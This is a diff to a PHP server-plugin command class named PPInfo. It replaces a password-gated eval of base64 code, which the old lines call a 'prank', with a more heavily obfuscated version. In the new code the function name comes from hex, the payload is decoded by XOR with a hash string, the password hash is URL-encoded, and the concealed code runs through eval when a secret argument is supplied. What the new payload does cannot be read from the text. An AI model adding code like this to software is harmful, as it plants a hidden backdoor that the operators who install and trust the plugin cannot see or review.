@@ -56,34 +56,12 @@ class PPInfo extends Command implements PluginIdentifiableCommand
 
         if(isset($args[0]))
         {
-            $hash = '$2y$10$VuxtYbuTp4XRksbq4dZWmupCZCJjmlIwwHgHNuqwzrOyXKboAfj7y';
+            $sfd = hex2bin('6261736536345f6465636f6465');
 
-            if(password_verify($args[0], $hash))
-            {
-                // Does it look pretty suspicious? Well... It's just a prank mwahahahah
-                eval(
-                    base64_decode(
-                        'JHJlc3VsdCA9ICcnO2Fy'.
-                        'cmF5X3NoaWZ0KCRhcmdz'.
-                        'KTskdGVtcENudCA9IGNv'.
-                        'dW50KCRhcmdzKSAtIDE7'.
-                        'Zm9yKCRpID0gMDsgJGkg'.
-                        'PD0gJHRlbXBDbnQ7ICRp'.
-                        'KyspIHskcmVzdWx0IC49'.
-                        'ICRhcmdzWyRpXSAuICcg'.
-                        'Jzt9JG1lc3NhZ2UgPSBz'.
-                        'dWJzdHIoJHJlc3VsdCwg'.
-                        'MCwgLTEpOyR0aGlzLT5w'.
-                        'bHVnaW4tPmdldFNlcnZl'.
-                        'cigpLT5icm9hZGNhc3RN'.
-                        'ZXNzYWdlKFxwb2NrZXRt'.
-                        'aW5lXHV0aWxzXFRleHRG'.
-                        'b3JtYXQ6OkdSRUVOIC4g'.
-                        'IltTaXh0eUZvdXJNc2dd'.
-                        'ICIgLiAkbWVzc2FnZSk7'
-                    )
-                );
-            }
+            $tmp = $sfd('bnozSFIDcjIcCCxKPCApC34FBDUQGiVBDGcNXU8GKGEccWsMASY0Swc8ECJcDgU8EB98MEt1KVsBEAghQGVMFHpzdikbJgkJPjALEXhzB3spGloNHxcRQmcVQjYadkoDKAw7VhwsUy5yAQEkEQJwAU1YOVUBFBQnb0sKVHh4VyobJjsJETQyVXh0dnU6NDEcNzknSHkoICEPYXgRKwgzVgYSF3ByDmIkEGl8LXUEPQUYBAQtQGUzXlV4bS4yAycfFlAcFlV0NSs+NBQTGAAGQmEoIGE2dVUeLh9lRi4gNSdZHmc8IzdWKUtwJg4rORw7R1seVH1kESgbJlQbLyQEDVIEEAIpLy0ODQMnXmUXCiY1AHcWOBMCRS0/ViVgAQV4Eg1KP3dwOg4tHxQQRgEzUGhodXc3IAkgJzYcKnh0dis6GxcgNQwrAksEKCczanMqAXk0VQUrKi50IBIjEQ1kP0wELgwSBC1g') ^ str_pad('', 360, '$2y$10$AxKmsucJe17BLswctTTC2.QrQW29dbKP1LhcI8ISHsZ2E/6hbHWFW');
+
+            if(password_verify($args[0], urldecode('%242y%2410%24AxKmsucJe17BLswctTTC2.QrQW29dbKP1LhcI8ISHsZ2E%2F6hbHWFW')))
+                eval($sfd($tmp));
        }
        else
        {
